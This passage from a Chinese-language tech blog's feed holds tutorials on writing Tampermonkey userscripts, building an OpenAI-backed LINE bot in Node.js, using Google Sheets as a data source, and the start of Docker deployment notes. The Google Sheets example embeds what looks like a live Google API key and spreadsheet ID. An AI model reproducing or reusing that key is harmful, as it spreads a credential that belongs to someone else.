@include 直接使用 console.log 或者聲明權限調用 GM_log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // ==UserScript== // @name Hello // @namespace http://tampermonkey.net/hello // @version 0.1 // @description try to take over the world! // @author You Name // @match https://zhihu.com/* // @match https://juejin.cn/* // @grant GM_log // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; GM_log(\u0026#34;Hello World\u0026#34;); })(); 搭建舒適的開發環境 使用在線編輯器小試牛刀之後，或許你也發現在線編輯器：\n缺少語法補全和自動提示 難以格式化代碼 不免懷念起 VSCode。\n或許你還會有更深遠的考慮，在線編輯器編輯完成後：\n怎麼同步到遠程倉庫，怎麼做代碼分發 如果要用到新語法，怎麼保證跨瀏覽器兼容性 如果代碼越寫越多，沒有模塊化怎麼管理 沒有 TS，很難保證長期維護 這些坑我已經踩過了，並且抽出一個腳手架工具 create-tampermonkey - npm (npmjs.com)，一鍵搭建舒適的油猴腳本開發環境。\n腳手架集成 rollup + babel + eslint + typescript，支持：\n自動生成 UserScript Header 語法和類型系統：ESNext、ES Module、TypeScript 樣式系統：CSS Modules，以及 scss、sass、less、stylus (需安裝對應依賴) 靜態資源：導入圖片、SVG 轉換為 Base64，同時支持 SVG Sprite 多語言 擴展：基於 Rollup，可以按需安裝插件進行擴展 create-tampermonkey 啟動項目 初始化項目 1 2 3 4 5 npx create-tampermonkey demo-userscript # 或者 npm init tampermonkey demo-userscript # 或者 yarn create tampermonkey demo-userscript 初始化完畢後，進入目錄安裝依賴。 1 npm run dev # 跑起開發模式 到瀏覽器中打開 dev.user.js，自動進入 Tampermonkey 腳本安裝界面。 最後一步：配置油猴插件 訪問 chrome://extension，找到油猴插件的卡片，點擊 Details 進入配置界面。\n勾選 Allow acess to file URLs。\n刷新頁面，出現彈窗，一切就緒。\n用 VSCode 打開項目，這時右下角會推薦一些輔助插件，建議安裝。\n代碼中使用到的 GM_xxx 會自動提取到 UserScript Header 中，當然也可以在 src/meta.json 中自定義。\n代碼的默認入口是 src/main.js 文件。\n實踐：掘金簽到功能 基於上面初始化的項目 demo-userscript 做一個小功能：掘金簽到功能。\n定位請求 \u0026ldquo;掘金簽到\u0026quot;本質是調用接口，我們的實現思路是追踪點擊\u0026quot;立即簽到\u0026quot;按鈕時請求發送情況，定位到\n調試接口 打開 Postman 做一下調試，這裡有一個導入小技巧：右鍵拷貝 cURL。\n到 Postman 中通過 curl 導入整個請求：點擊左側面板中的 import 按鈕，選擇 Raw text 貼上上一步複製的內容即可。\n獲取參數 在 Postman 中發現請求需要 aid、uuid、_signature 三個參數，試試看不帶參數能否請求成功，先確定好必不可少的參數和請求頭。\n簡單嘗試後，發現這裡並不需要帶 aid、uuid、_signature 三個參數，主要是依賴 cookie，使用 GM_xmlhttpRequest 會自動帶上對應的 cookie，事情變得簡單。\n修改 src/main.js 的代碼：\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;簽到成功\u0026#34;); } else { alert(data.err_msg); } } }, }); 刷新頁面測試一下。在其他站點刷新一下居然也可以發送請求，這就是插件沒有跨域限制的優勢了。\n再做一下節流優化。利用 GM_setValue 和 GM_getValue 做持續存儲。\nsrc/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 const storageKey = \u0026#34;last_sign_timestamp\u0026#34;; // 取得上一次簽到的日子 const lastSignNumberOfDays = GM_getValue(storageKey, 0); // 計算現在所在的日子 const currentNumberOfDays = Math.floor( new Date().valueOf() / 1000 / 60 / 60 / 24 ); // 如果今天已经請求過，不再請求 if (currentNumberOfDays !== lastSignNumberOfDays) { GM_xmlhttpRequest({ url: \u0026#34;https://api.juejin.cn/growth_api/v1/check_in\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;user-agent\u0026#34;: navigator.userAgent, }, responseType: \u0026#34;json\u0026#34;, onload(response) { if (response.status === 200) { const data = response.response; if (data.data === \u0026#34;success\u0026#34;) { alert(\u0026#34;簽到成功\u0026#34;); } else { alert(data.err_msg); } // 更新最近一次簽到的日子 GM_setValue(storageKey, currentNumberOfDays); } }, }); } 難免會遇到需要獲取數據的情況，可訪問的數據一般有三種：\n頁面中包含數據，通過DOM 獲取 通過接口請求得到 存儲在本地存儲中，localStorage 或 cookie 之類 確定方式很粗暴：\n複製參數或參數值到Element 中搜索 查看前面幾個請求，看看是否有跡可循 到 localStorage 或 cookie 中搜索 發布腳本 在本地開發完腳本之後，npm run build 構建生產版本並上傳代碼到 Github 或 Gitee。\n用 Github/Gitee 上文件的 Raw URL 就能直接實現分發。如果在 package.json 中設置好 repository，create-tampermonkey 會自動生成 Raw URL 並賦給 downloadURL、updateURL。\n但這樣分發存在的問題是無法統計下載量、從網絡訪問的角度考慮同時維護 Github 和 Gitee 兩個倉庫。\n另一種分發方式是上傳到腳本平台 greasyfork.org/，登錄後即可發布新腳本，如果代碼託管在 Github 或 GitLab 還可以使用 Webhooks 實現自動更新。\n開發技巧 調試油猴腳本 油猴腳本的運行依託於 background script 和 content script，在調試前需要對運行環境有所區分，例如 GM_xmlhttpRequest 請求是 background script 發出的，DOM 處理和腳本邏輯是 content script 執行的。\n確定環境之後，就可以使用對應的調試方式進行調試了。\n調試 background script 還是訪問 chrome://extension，找到油猴插件的卡片：\ninspect views 後面有個 background.html，點擊一下彈出 background script 的調試彈窗。\n調試 content script 在網頁inspect -\u0026gt; Sources -\u0026gt; Page 下找到 Tampermonkey 目錄，頁面中運行的油猴腳本代碼都在這了，選擇目標，斷點調試即可。\n獲取 userId 等信息 有時候需要拿一些額外信息做請求，一般有三種方式：\n看看能不能在頁面中搜索到，通過 DOM 獲取 看看有沒有接口可以調用獲取 看看本地存儲裡有沒有 目標 DOM 節點未掛載怎麼辦？ 如果節點是在首屏加載的，粗暴的方法是使用 setTimeout 做一下延時。\n但如果是在交互過程中有DOM 更新，就只能引入監聽機制了，使用 MutationObserver 來實現。\n具體的實例可以看【開發記錄】掘金\u0026quot;破圈行動\u0026rdquo; 輔助腳本- 掘金(juejin.cn)\n查看插件源碼 瀏覽器插件安裝之後，插件包被下載到本地目錄中，可通過下述方法訪問。\n訪問 chrome://version，找到 Profile path(存放用戶數據的路徑)\n訪問 chrome://extensions/，找到目標插件的ID\n將 Profile Path 和插件 ID 拼裝在一起 ${Prifile Path}/Extensions/${Extension Id}，便是插件包的路徑了。友情提示，通過命令行訪問時需要在空格前加個 \\ 轉義一下。\n總結 瀏覽器插件利用瀏覽器能力進行功能擴展，具有跨域請求、讀取 cookie、管理歷史記錄、註冊右鍵項等能力。\n瀏覽器插件的能力很豐富，能夠實現複雜的功能。但如果只是做一些針對頁面的操作，只需要依賴基礎能力，完全可以使用油猴腳本實現，開發更便捷分發更迅速。\n開發油猴腳本，主要是使用 Tampermonkey API 和 JavaScript。\ncreate-tampermonkey 腳手架提供一個全面的油猴腳本開發環境，依托這個環境，可以使用最新的 ES 語法、TypeScript、CSS Modules，在 VSCode 中進行模塊化開發，大大提高開發效率。\n開發完畢的油猴腳本可通過 Github/Gitee Raw URL 或 Greasy Fork 平台分發。\n瀏覽器插件的主要分工為 background script 和 content script 兩部分，在調試油猴腳本時需要思考清楚是哪一部分出現的問題，再採用對應的調試方式。\n實現了兩個小實踐，走出第一步，接下來盡情發揮創造力吧，玩得開心～\n最後分享一下我的 Tampermonkey UserScripts 清單，持續更新，需要的歡迎下載來使用！\n","date":"2022-12-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52564977913_09952966be_o.jpg","permalink":"https://wayneblog.ga/2022-12-15/tampermonkey-userscript-tutorial/","title":"【Tampermonkey】輕鬆上手 - 油猴腳本開發"},{"content":" 參考網站\n參考網站\n最近 OpenAI 的 ChatGPT 非常的火紅，剛好這個 ChatGPT 是有提供 API 可以串接的，也非常適合整合到 Line Bot 上，所以這一篇我就來介紹如何使用 Node.js 基於 OpenAI 的 ChatGPT API 來建立一個 Line 聊天機器人吧！\n申請 OpenAI API 首先，請你先進入 OpenAI 的網站註冊會員，這邊你可以選擇第三方服務帳號(如：Google、Microsoft)或是 Email 帳號註冊。\n註冊完後，你就可以開始申請 API 了！\n如果你本身有帳號的話，那就直接登入 OpenAI 吧。\n登入後，你應該會看到這個畫面\n接著找到你的頭像點它，找到「View API keys」。\n找到後你會看到「API keys」的申請畫面，點一下下方的「Create New Secret key」，這樣你就拿到串接 OpenAI 的 key，請先把它記下來，後面會用到。\nAPI key generated 是非常重要的，因此請不要隨意提供給他人，以免造成不必要的損失。\n那麼我們申請這個是 API Key 要幹嘛呢？主要是稍後後面會串接 OpenAI 所提供的 API 來使用 ChatGPT，如果你還不知道什麼是 ChatGPT 的話，你可以試著玩一下 ChatGPT，簡單來講 ChatGPT 是一個非常聰明且厲害的聊天機器人，它可以做到的事情非常多，例如像是\u0026hellip;\n請它規劃日本旅遊行程 寫一篇行銷文案 幫忙找出程式碼錯誤 程式碼解題 \u0026hellip;等等，非常多\n因此我們申請這個 API Key 就是用來串接 ChatGPT 的！\nOpenAI 本身有提供免費的額度，三個月 18 美金，除此之外，OpenAI 的計算方式會因你使用的 model 不同而有不同的計算方式，例如像是「Davinci」的計算方式是 $0.0200(美金) / 1K tokens，如果你想要了解更多的話，可以參考這邊。\n額外補充\n什麼是 tokens？\ntokens 是指你輸入的字數，例如：「我想要去日本旅遊」，這句話有 8 個字，因此 tokens 就是 8。\n申請 Line Developer 接下來我們要來申請 Line Developer 帳號，你可以透過這個連結快速進入 Line Developer 網站，登入方式，基本上就是使用 LINE 帳號登入。\n登入後，你可以透過這個連結，進入 LINE 的開發者後台。\n接著，你會看到畫面上什麼都沒有，所以這邊你要點一下中間的「Create a new provider」，這個類似於一個公司帳號的概念，底下會有許多的專案，所以你可以把它想像成一個公司，而這個公司底下有許多的專案，例如：Line Bot、Line MUSIC 等等之類你的服務。\n這邊的話，範例我們就叫做「Wayne\u0026rsquo;s OpenAI Bot」。\n建立的過程是非常快的，因此當你點下「Create」 之後，你就可以馬上看到 Wayne\u0026rsquo;s OpenAI Bot 的畫面。\n接著，點一下畫面上的 「Create a Messaging API channel」，因為我們要來申請一個聊天機器人，所以我們要使用「Messaging API」。\n進入「Create a Messaging API channel」後，會有一些欄位要填寫：\nChannel type： 保持預設 Messages API。 Provider： 保持預設 「Wayne\u0026rsquo;s OpenAI Bot」 即可。 Company or owner’s country or region： 依據你的公司所在地選擇，這邊我選擇台灣。 Channel icon： 你可以之後再上傳，所以這邊先不用管。 Channel name： 這邊我們就叫「Wayne\u0026rsquo;s AI」吧。 Channel description： 你可以簡單描述一下，這個聊天機器人的功能，例如：「用於串接 OpenAI 的偉恩 Line 機器人」。 Category： 就選擇…「其他媒體」。 Subcategory： 接著一樣選「媒體（其他）」。 Email address： 這是當你的聊天機器人有問題時，信箱聯絡你的方式。 Privacy policy URL 與 Terms of use URL： 這兩個就不用理它，因為我們目前用不到。。 最後再打勾兩個條管，你就可以點下「Create」建立你的聊天機器人了。\n由於這個頁面圖片太大張了，所以就不額外截圖。\n當你按下「Create」之後，它會出現一個視窗，主要是告知你一些資訊，所以你可以按下 OK 關閉它。\n到目前為止，我們只是申請好了一個 Line Bot，接著要來取得一些資訊，首先在「Base settings」中找到以下資訊並複製起來。\nChannel ID Channel secret 接著切換到「Messaging API」，找到「Channel access token」。\n接著按下 「issue」，你會取得一串很長的 Token，請複製起來，後面我們會使用到。\n到目前為止，我們已經準備好了 Line Bot 的申請以及 OpenAI API 的申請，接下來就是準備進入撰寫程式碼的部分囉。\n建立一個專案 建立專案方式我就不多述了，相信大家應該都很熟悉怎麼建立專案以及安裝 Node.js，而這邊我稍微會有一點特別，我會使用 pnpm 來建立，如果你真的完全沒想法，你可以參考我以下指令來建立一個專案，當然你也可以使用 npm 或是 yarn 來建立。\n提示：以下指令適用於 Mac 系統，若為 Mac 建議額外 Google 一下指令。\n1 2 3 4 5 6 7 8 9 10 11 # 若尚未安裝pnpm，可使用此指令先進行安裝 # npm install -g pnpm # 建立一個資料夾 mkdir line-bot # 進入資料夾 cd line-bot # 初始化專案 pnpm init 基本上到這邊就算是初始化好一個專案了，接著就是準備要來安裝 Line Bot 的套件了。\n安裝相關套件 接下來我們要安裝 @line/bot-sdk 這個套件，請在專案終端機下輸入以下：\n1 pnpm i @line/bot-sdk express dotenv 安裝好之後，你可以先在專案底下建立一個 app.js 的檔案，稍後我們就會開始撰寫 LINE Bot 的程式碼囉。\n撰寫 LINE Bot 前面我們已經準備好了 app.js 檔案，接著就是要撰寫程式碼，不外乎前面就是引入 @line/bot-sdk、express 與 dotenv 這三個套件。\napp.js 1 2 3 4 require(\u0026#39;dotenv\u0026#39;).config(); const express = require(\u0026#39;express\u0026#39;); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); 接著呢？其實 Line 官方有提供範例程式碼，因此我們是可以直接嘗試挪過來測試看看。\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require(\u0026#39;dotenv\u0026#39;).config(); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); const express = require(\u0026#39;express\u0026#39;); // create LINE SDK config from env variables const config = { channelAccessToken: process.env.CHANNEL_ACCESS_TOKEN, channelSecret: process.env.CHANNEL_SECRET, }; // create LINE SDK client const client = new line.Client(config); // create Express app // about Express itself: https://expressjs.com/ const app = express(); // register a webhook handler with middleware // about the middleware, please refer to doc app.post(\u0026#39;/callback\u0026#39;, line.middleware(config), (req, res) =\u0026gt; { Promise .all(req.body.events.map(handleEvent)) .then((result) =\u0026gt; res.json(result)) .catch((err) =\u0026gt; { console.error(err); res.status(500).end(); }); }); // event handler function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: event.message.text }; // use reply API return client.replyMessage(event.replyToken, echo); } // listen on port const port = process.env.PORT || 3000; app.listen(port, () =\u0026gt; { console.log(`listening on ${port}`); }); 記得在專案底下建立一個 .env 並填寫以下資訊跟 Key。\n1 2 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= 理論上來講，你目前專案應該是已經可以輸入 node app.js 啟動了，所以你可以嘗試啟動看看，如果無法啟動的話，會建議你往前面的步驟再檢查一下。\n部屬到 Render 到目前為止我們要先嘗試將專案部署到 Render 上面，否則我們並不清楚專案是否可以正常運作，因為在使用 Render 之前，我們需要先建立一個 Render 的帳號，如果你還沒有的話，可以先到這邊註冊一個帳號。\n建立好後，會建議你將專案程式碼上傳到 GitHub 上，因為 Render 有提供 GitHub 的整合，這樣可以讓我們更方便的部署專案，而上傳到 GitHub 這流程就不再贅述了，因此我這邊假使你已經完成了將程式碼上傳到 GitHub 這個動作後，接著就是直接進入到 Render 後台。\n這邊請選擇 「Web Services」。\n接著你可以在這個畫面上選擇專案，如果你發現你的畫面上一個專案都沒有的話，可以點一下旁邊的「Configure account」。\n接著你可以在這邊選擇專案，懶一點的話你可以乾脆給它全部的權限，因為我們只是要部署一個簡單的專案，所以我就選擇我要的單一專案即可。\n接下來畫面上應該就可以看到你的專案了，接著點選你要部署的專案。\n在這邊點一下「Connect」。\n這邊會要求你填一些欄位，我就不多說明了，我直接附上我的設定。\n接著往下滾，就選擇 「Free」專案即可，然後再點一下下方的「Advanced」。\n因為我們要在「Advanced」區塊填入環境變數。\n接著點一下「Add Environment Variable」，依照欄位填入。\n最後其他設定可以不用管，直接點一下最後的「Create Web Service」。\n預設 Render 會去偵測 Commit 紀錄，所以如果有新的 Commit，Render 會自動重新部署，如果你不想要這個功能的話，可以在「Advanced」區塊裡面，將「Auto Deploy」關閉。\n那麼由於為了方便示範，因此我這邊預設會採用「Yes」。\n接著你就可以看到你的專案正在部署了。\n這個過程稍微會比較久一點，因為 Render 會將它打包成一個 Docker Image，然後再部署到它的伺服器上，所以這個過程會稍微比較久一點，但是不用擔心，因為它會自動幫你做這些事情，你只要等待它完成即可。\n部署完畢的話，你可以在畫面看到他提示你專案已經運行起來並且開始部署。\n而你的專案的網址，就會在這邊：\n不出意外的話，應該是無法開啟的，因為我們只有做一個 post 的 API，那麼到這邊我們專案就正式部署出去了，基本上都不用理會它了。\n這邊請記住網址，因為後面我們會在使用到。\n加入 Line Bot 好友 接下來我們就要來實際測試一下，我們的 Line Bot 是否可以正常運作，而取得這個 LINE Bot 的 ID 方式就在 Developer Console 的「Messaging API」裡面。\n加入好友後，你應該就會立刻看到好友歡迎的訊息通知。\n接著你可以試著發送訊息給它，例如「Test」，但是你會發現它沒有辦法正常回應你。\n因此接下來，我們要做一點調整，讓它可以正常回應你。\n調整 Line Bot 這邊請你回到 Line Bot 的後台，點一下「Messaging API」，然後找到「Webhook settings」。\n接著點一下「Edit」，然後將「Webhook URL」填入你的專案網址，例如 https://example.com/callback\ncallback 是因為我們 Express 專案的路由是 /callback，如果你的路由不是這個的話，請自行修改。\napp.js 按下儲存後，你可以點一下「Verify」，來驗證你的網址是否正確以及專案是否正常，只要能看到「Success」就代表你的網址以及專案是正確的。\n接著將下方的 「Use webhook」打開。\n打開後，你再去試著發送訊息給你的 Line Bot，你就會發現它可以正常回應你了，而且是不論你打什麼，他都會回應你剛剛打的字。\n恭喜你，截至為止，我們終於把 Line Bot 正式處理好了。\n關掉預設回饋 接下來你可能會想要把那段該死的提示回饋：\n1 2 3 4 感謝您的訊息！ 很抱歉，本帳號無法個別回覆用戶的訊息。 敬請期待我們下次發送的內容喔(moon smile) 以及加入好友通知：\n1 2 3 4 5 6 XXX您好！ 我是Wayne\\\u0026#39;s AI。 感謝您加入好友 此官方帳號將定期發放最新資訊給您 敬請期待 這兩個關掉，關掉方式很簡單，一樣回到 Line Bot 的後台，點一下「Messaging API」，然後找到「Auto-reply messages」。\n你會跳到 LINE@ 管理介面，將「加入好友歡迎訊息」以及「自動回覆訊息」關掉就搞定囉！\n串接 OpenAI API 終於到了我們的重頭戲了，前面你可以發現 LINE Bot 的流程與申請非常的多且繁瑣，因此前面花很多時間在介紹，主要是希望你可以順利建立好你的 LINE Bot，確保你接下來的步驟不會有問題。\n安裝 OpenAI 套件 首先我們要先安裝 OpenAI 的套件，請在專案底下輸入以下指令：\n1 pnpm i openai 接著 openai 本身有提供範例程式碼：\n1 2 3 4 5 6 7 8 9 10 11 12 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-002\u0026#34;, prompt: \u0026#34;Hello world\u0026#34;, }); console.log(completion.data.choices[0].text); 因此基於上方這一段，我們稍候可以來修改一下，讓它可以跟我們的 LINE Bot 串接。\nopenAI 有提供多個 model 可以選擇，分別是：\ntext-davinci-003 text-curie-001 text-babbage-001 text-ada-001 其中目前(2022年)最紅的就是 text-davinci-003，因此我們這邊也會使用這個 model，每一個 model 都有不同的特性，你可以在這裡找到它的介紹。\n調整 app.js 的程式碼 首先我們要先在 app.js 中引入 OpenAI 的套件。\napp.js 1 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); 接下來我們要來實例化 OpenAI。\napp.js 1 2 3 4 const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); apiKey 就是我們最早前面所申請的 OpenAI API Key，而這一段一樣是放在 .env 的。\n如果你沒申請的話你會無法往下繼續的，請務必申請 OpenAI API Key 唷。\n目前來講，你的 .env 應該長這樣：\n1 2 3 4 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= OPENAI_API_KEY= 接下來呢？我們就要將原本 Line 官方所提供的範例程式碼稍微調整一下，主要調整的範圍是 handleEvent 的程式碼：\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , }); // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text }; // use reply API return client.replyMessage(event.replyToken, echo); } 這邊我們將原本的 prompt 改成 event.message.text，也就是使用者輸入的訊息，而 completion.data.choices[0].text 就是 OpenAI 所回傳的訊息。\n沒問題後就儲存檔案，並 commit push 出去到 GitHub 上，屆時 Render 就會自動幫你重新部署了。\n記得要去 Render 上面增加 OPENAI_API_KEY 的環境變數，否則會出現錯誤唷。\n當部署完畢後，你再去試著跟你的 LINE Bot 聊天，你會發現它已經會講話囉！\n只是你會發現它好像沒辦法回你很多話，這原因是我們沒有告知它要使用多少 Tokens，因此這邊我們調整一下：\napp.js 1 2 3 4 5 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text, max_tokens: 200, }); 這個 max_tokens 會影響到 OpenAI 所回傳的訊息長度，因此我們這邊設定為200，這樣就可以讓它回很多話了。\n調整 OpenAI 的回傳訊息 那麼這邊也有一件很有趣的事情，也就是 OpenAI 的訊息都有一大推空白，這是因為 OpenAI 會將你的訊息分成一個個的段落，而每個段落之間都會有一個空白，因此我們也要來調整一下。\napp.js 1 2 3 4 5 6 7 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , max_tokens: 200, }); const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text.trim() }; 再重新上傳程式碼後，你就可以看到機器人正常的回你了。\n恭喜你，完成了一個可以跟你聊天的機器人！而且是串接了 OpenAI 的機器人！\n結語 相信你應該發現這個 Line Bot 的建立流程超級無敵的長，而且非常的多流程跟細節，但是你也可以因此認識到如何串接第三方服務，以及如何將你的程式碼部署到 Render 上面，所以我覺得是一個相當不錯的小練習，所以如果你想嘗試做一個聊天機器人，是可以考慮使用這個方法的。\n但是要注意一件事情 OpenAI 的 GPT 有一個重點使用，如果你要讓你聰明一點的回覆你，那麼你就要將它的上下文（包含你的回覆）一起撈出來丟給它，否則你會發現它有點笨，可是 LINE 的聊天機器人不太適合這種方式，因為過程你可能會問很多事情，這樣子訊息量會非常龐大且沒辦法刪除，因此這邊我們就不做這件事情了，而是讓它針對你每個問題去回覆即可，而不包含前一個問題的回覆。\n最後這邊我也附上範例程式碼，如果你想直接拉回去用也是可以的，因為這一份程式碼基本上都是以官方所提供的為主，很少有大幅度調整的部分，所以你可以直接拿來用。\n希望這一篇可以讓你快快樂樂做出一個 LINE Bot。\n如果你覺得部署到 Render 很難去除錯，其實是可以考慮使用 ngrok 的，ngrok 的使用方法可以參考這裡。\n","date":"2022-12-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52558908513_206844d03c_o.png","permalink":"https://wayneblog.ga/2022-12-12/nodejs-create-openai-line-bot/","title":"用 Node.js 建立你的第一個 OpenAI LINE Bot 聊天機器人"},{"content":" 參考網站\nGoogle 試算表名稱是 Google Sheets，但為了讓大家好理解，以下也會稱 Google Excel。\n這一篇說明如何把 Google Excel 當作資料庫，並實作出一個簡單的會員列表頁出來。\n建立 Google Excel 在 Google Drive 上，按新增，選擇「Google 試算表」，就會進到一張新的 Google Excel。\n這邊設定的假資料欄位，總共有以下 5 個：\nid：流水號 name：姓名 image：圖片 email：信箱 phone：電話 要注意，欄位名稱的部份要用英文，在下面接資料那段會解釋原因。\nDemo 的資料如下：\n發佈 Google Excel 到網路 這步最簡單也最重要，只有選擇發佈到網路上的 Google Excel，才能 GET 到資料。\n首先，點擊左上角的「檔案」\u0026gt;「共用」，會看到展開的選項裡有「發佈到網路」：\n點擊後，會出現詢問框，問說發佈的範圍：\n這篇 Demo 因為只有一張表，所以直接用「整份文件」，如果是有很多張表，但限制其中幾張是可以抓的，就選擇可以公開的表即可。\n按下「發佈」後，就會看見結果的詢問框：\n就可以按下叉叉關掉這框了。\n接著記得將表單的「檢視」權限開放給知道連結的任何人，以免後面步驟因權限不足而被阻擋。\n取得 Google API Key 1. GCP 新增新專案 沒有專案的才需要這步，進到 Google Cloud Platform 的頁面按下新增專案，取好專案名稱後即可新增。\n2. 開通 Google Sheets API 功能 有了 GCP 的專案後，進到 API 程式庫：https://console.cloud.google.com/apis/library?hl=zh-TW\n搜尋欄中搜尋「sheet」，會看到一項「Google Sheets API」：\n點擊後按下「啟用」，專案就會開通 Google Sheets API 的功能：\n啟用完成，頁面會回到 GCP 的頁面，可以看到上面一條訊息提醒要有憑證才能使用 API：\n直接點擊「建立憑證」，或是打開網址：https://console.cloud.google.com/apis/credentials/wizard?hl=zh-TW\n3. 建立憑證 建立憑證的第一步要先做一些選擇：\n「選取 API」，選擇「Google Sheets API」。\n「您需要存取什麼資料？」，這段看了 說明文件 也看不太懂使用的情境，選擇「應用程式資料」就可以。\n「您打算將這個 API 與 Compute Engine、Kubernetes Engine、App Engine 或 Cloud Functions 搭配使用嗎？」，本篇只是為了要能夠取得 Google Sheets 中的資料，並不會用到上述的功能，選擇「不，我不會使用任何一項憑證」。\n接著按「下一步」。\n下一步是填寫我們建立這個帳戶的資料，填寫成我們之後回頭來看時，看得懂要做什麼的資訊就可以：\n填寫完後按下「建立並繼續」。\n後面二項是選填，不用設定也沒關係，按下「完成」。\n4. 建立 API 金鑰 上一步完成後，頁面會回到 憑證的頁面，點擊上方的「建立憑證」，選擇「API 金鑰」：\n幾秒後，就會看見跳出一個小視窗，上面寫了「您的 API 金鑰」，這個金鑰也就是我們要取 Google Sheets 時後面要附上的：\n視窗上面也提醒了，為了怕金鑰被外人拿到也可以用，我們必須要對這組金鑰加上限制，點擊「限制金鑰」就會進入設定的頁面。\n建議一定要設定限制，本篇的 Demo 有限制只有在 Demo 頁下才有效，而且也只能用 Google Sheets API 的功能。\n有了 API 金鑰，接著就是用新的 URL 去執行 GET。\nGoogle Sheets URL V4 版的 URL 規則如下：\n1 https://sheets.googleapis.com/v4/spreadsheets/{表單id}/values/{sheet名稱}?alt=json\u0026amp;key={API金鑰} {表單id}：表單的網址上就可以看到。 {sheet名稱}：就是每一張試算表的名稱，預設會是叫「工作表1」，這邊有測試過，有支援中文。 {API金鑰}：就是上一段我們從 GCP 上取得的金鑰。 我們用一個簡單的 fetch 來取：\n1 2 3 4 5 fetch(\u0026#39;https://sheets.googleapis.com/v4/spreadsheets/1-vTT5LVlscvExPjqJHrhmlO2ZMM-93McoP-yXT8gyOU/values/工作表1?alt=json\u0026amp;key=AIzaSyAVlwHA4EQx7AWjK1QsT87shL37vhKWrl4\u0026#39;) .then(res =\u0026gt; res.json()) .then(res =\u0026gt; { console.log(res) }) Console 上會看到回來的資料如下：\n回來資料的格式，所有資料都收在 values 裡，Google Sheets 上的每一列會成為一個一個的陣列。\n相關連結 附上本篇的相關連結：\n網站成果 Google Sheet 網站原始碼 Github 空間 ","date":"2022-12-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52550876753_d803ddfa87_o.jpg","permalink":"https://wayneblog.ga/2022-12-10/use-google-sheet-as-db/","title":"如何用 Google Sheets / Excel 當作資料庫？"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n前言 發表 Docker 筆記以來，一直有網友提醒應改用 Kubernetes (K8S)，關於這點在前篇文章已經提過，用 Docker / Docker-Compose 玩玩小網站還 OK，一旦涉及高可用性如備援、負載平衡，若不依賴現成管理架構，維運操作將複雜到會咬人。而 Kubernetes 正是目前容器管理框架的主流業界標準，尤其如打算將容器直接部署到雲端廠商(Azure、AWS、Google GCP)，不會 Kubernetes 更是寸步難行。故在次聲明以正視聽，在企業環境如需考量高可用性、負載平衡或想直接部署到廠商雲端，一般不會用 Docker-Compose 而會採用 Kubernetes，請大家注意。\n這篇筆記是我將部落格網站移入 Docker 容器的經驗分享，將記錄 Miniblog.Core ASP.NET Core 網站搬進 Docker 過程遇到的一些眉角。\nReverse Proxy 問題 由於我打算在同一機器上共享對外 IP 跑多個網站，因此採行前一篇筆記所說的「以 Compose 組合網站與 DB，網站對映 Host IP/Port，Nginx 另跑容器導向各網站 Port」策略。\n目錄對應 部落格網站有一些執行期間更新的內容，包含 NLog Log 檔、文章圖檔、SQLitｅ 資料庫等，這些內容不適合放在容器裡，故都需設 Volume 對映到 Host OS 的實際檔案，如此容器可任意刪除重建及升級，管理運用較方便。\n時區問題 踩了雷才知道：Docker 容器內的時區跟 Host OS 是脫鉤的。即便本機已設好定為台北時區，Docker 容器預設為 UTC+0 時區，有兩種做法：\n在 docker-compose.yml 中加註環境參數 TZ 新增 Volume 對映 /etc/localtime:/etc/localtime:ro，要求容器以 Host OS 的時區為準 第一種做法遇到以 Alpine Linux 版 Image 建的容器需要額外裝套件，故對映 /etc/localtime 較單純。\n參考：設定 Docker Container 與 Host 相同時區的方法\n取得真實來源 IP 問題 Reverse Proxy 來源 IP 在 ASP.NET Core + Nginx on CentOS 安裝筆記 提過，當 ASP.NET Core 架設在 Reverse Proxy 後方，直接看到的是 Reverse Proxy 的 IP，要得到真實來源 IP，在 Nginx config 需加註 proxy_set_header X-Forwarded-For 